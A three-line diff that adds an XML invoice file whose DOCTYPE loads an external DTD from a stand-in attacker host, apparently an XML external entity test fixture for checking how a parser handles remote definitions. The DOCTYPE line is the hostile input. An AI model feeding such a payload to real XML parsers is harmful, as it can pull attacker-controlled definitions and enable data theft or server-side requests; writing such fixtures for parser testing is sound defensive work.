@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.example/evil.dtd">
+<Invoice><ID>1</ID></Invoice>
